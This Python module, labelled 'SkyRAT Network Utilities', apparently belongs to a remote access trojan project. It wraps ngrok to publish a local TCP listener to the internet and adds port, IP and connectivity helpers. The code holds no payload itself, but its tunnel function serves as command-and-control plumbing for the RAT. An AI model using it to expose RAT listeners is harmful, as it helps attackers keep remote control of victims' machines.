#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SkyRAT Network Utilities
Handles ngrok setup and network-related functions
"""

import socket
import subprocess
import time

try:
    from pyngrok import ngrok, conf
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False

def log(message, level="INFO"):
    """Simple logging function"""
    colors = {
        "INFO": "\033[1m\033[36m",
        "SUCCESS": "\033[1m\033[32m", 
        "WARNING": "\033[1m\033[33m",
        "ERROR": "\033[1m\033[31m"
    }
    color = colors.get(level, "")
    print(f"{color}[{level}]\033[0m {message}")

def setup_ngrok(port):
    """Setup ngrok tunnel for external access"""
    if not NGROK_AVAILABLE:
        log("pyngrok not found. Install it with: pip3 install pyngrok", "ERROR")
        raise Exception("pyngrok not available")
    
    try:
        # Configure ngrok
        conf.get_default().monitor_thread = False
        
        # Create TCP tunnel
        tcp_tunnel = ngrok.connect(int(port), "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        
        # Extract domain and port from tunnel URL
        # URL format: tcp://0.tcp.ngrok.io:12345
        tunnel_url = tcp_tunnel.public_url
        if tunnel_url.startswith("tcp://"):
            tunnel_url = tunnel_url[6:]  # Remove tcp://
        
        domain, tunnel_port = tunnel_url.split(":")
        ip = socket.gethostbyname(domain)
        
        log(f"Ngrok tunnel created successfully", "SUCCESS")
        log(f"External URL: tcp://{domain}:{tunnel_port}")
        log(f"Resolved IP: {ip}:{tunnel_port}")
        
        return ip, tunnel_port
        
    except Exception as e:
        log(f"Failed to setup ngrok: {e}", "ERROR")
        raise

def check_port_available(ip, port):
    """Check if port is available for binding"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((ip, int(port)))
            return True
    except OSError:
        return False

def get_local_ip():
    """Get local IP address"""
    try:
        # Connect to a remote address to determine local IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        return local_ip
    except Exception:
        return "127.0.0.1"

def validate_ip_address(ip):
    """Validate IP address format"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port_number(port):
    """Validate port number range"""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except (ValueError, TypeError):
        return False

def test_connection(ip, port, timeout=5):
    """Test if connection can be established to IP:port"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((ip, int(port)))
            return result == 0
    except Exception:
        return False

def get_network_interfaces():
    """Get available network interfaces (basic implementation)"""
    interfaces = []
    try:
        # Try to get interface info using ip command (Linux/macOS)
        result = subprocess.run(['ip', 'addr', 'show'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            for line in lines:
                if 'inet ' in line and '127.0.0.1' not in line:
                    parts = line.strip().split()
                    ip_with_mask = parts[1]
                    ip = ip_with_mask.split('/')[0]
                    interfaces.append(ip)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        # Fallback to basic method
        interfaces.append(get_local_ip())
    
    return list(set(interfaces))  # Remove duplicates

def check_internet_connectivity():
    """Check if internet connection is available"""
    test_hosts = [
        ("8.8.8.8", 53),      # Google DNS
        ("1.1.1.1", 53),      # Cloudflare DNS
        ("208.67.222.222", 53) # OpenDNS
    ]
    
    for host, port in test_hosts:
        if test_connection(host, port, timeout=3):
            return True
    return False

def find_available_port(start_port=8000, end_port=9000):
    """Find an available port in the given range"""
    for port in range(start_port, end_port + 1):
        if check_port_available("0.0.0.0", port):
            return port
    return None

class NetworkManager:
    """Network management utilities"""
    
    def __init__(self):
        self.ngrok_tunnel = None
        self.local_ip = get_local_ip()
    
    def setup_tunnel(self, port):
        """Setup ngrok tunnel"""
        if not NGROK_AVAILABLE:
            raise Exception("pyngrok not available")
        
        try:
            self.ngrok_tunnel = setup_ngrok(port)
            return self.ngrok_tunnel
        except Exception as e:
            log(f"Tunnel setup failed: {e}", "ERROR")
            raise
    
    def cleanup_tunnel(self):
        """Cleanup ngrok tunnel"""
        if NGROK_AVAILABLE and self.ngrok_tunnel:
            try:
                ngrok.disconnect(self.ngrok_tunnel[1])
                ngrok.kill()
                log("Ngrok tunnel closed", "INFO")
            except Exception as e:
                log(f"Error closing tunnel: {e}", "WARNING")
    
    def get_connection_info(self, ip=None, port=None, use_ngrok=False):
        """Get connection information"""
        if use_ngrok:
            if not NGROK_AVAILABLE:
                raise Exception("pyngrok not available for tunnel")
            tunnel_ip, tunnel_port = self.setup_tunnel(port)
            return {
                'type': 'ngrok',
                'ip': tunnel_ip,
                'port': tunnel_port,
                'local_port': port,
                'url': f"tcp://{tunnel_ip}:{tunnel_port}"
            }
        else:
            return {
                'type': 'direct',
                'ip': ip or self.local_ip,
                'port': port,
                'url': f"tcp://{ip or self.local_ip}:{port}"
            }
    
    def validate_connection_params(self, ip, port):
        """Validate connection parameters"""
        errors = []
        
        if not validate_ip_address(ip):
            errors.append(f"Invalid IP address: {ip}")
        
        if not validate_port_number(port):
            errors.append(f"Invalid port number: {port}")
        
        if not check_port_available(ip, port):
            errors.append(f"Port {port} is not available on {ip}")
        
        return errors

def print_network_info():
    """Print network information for debugging"""
    print("\n=== NETWORK INFORMATION ===")
    print(f"Local IP: {get_local_ip()}")
    print(f"Internet connectivity: {'Yes' if check_internet_connectivity() else 'No'}")
    print(f"Ngrok available: {'Yes' if NGROK_AVAILABLE else 'No'}")
    
    interfaces = get_network_interfaces()
    if interfaces:
        print("Available interfaces:")
        for interface in interfaces:
            print(f"  - {interface}")
    
    available_port = find_available_port()
    if available_port:
        print(f"Example available port: {available_port}")
    
    print("===========================\n")

# Utility functions for backward compatibility
def setup_ngrok_tunnel(port):
    """Backward compatibility function"""
    return setup_ngrok(port)

def is_ngrok_available():
    """Check if ngrok is available"""
    return NGROK_AVAILABLE